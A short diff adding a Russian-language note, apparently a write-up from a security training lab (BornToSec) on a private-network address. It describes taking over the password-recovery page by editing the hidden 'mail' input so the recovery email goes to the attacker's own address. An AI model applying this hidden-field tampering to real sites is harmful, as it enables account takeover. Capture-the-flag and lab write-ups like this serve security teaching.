@@ -1,0 +1,5 @@
+Все что надо сделать это на страничке
+http://192.168.56.1/index.php?page=recover
+заменить почту указанную в инпуте на свою
+<input type="hidden" name="mail" value="webmaster@borntosec.com" maxlength="15">
+value="webmaster@borntosec.com" -> value="zoedberg@i.ua"
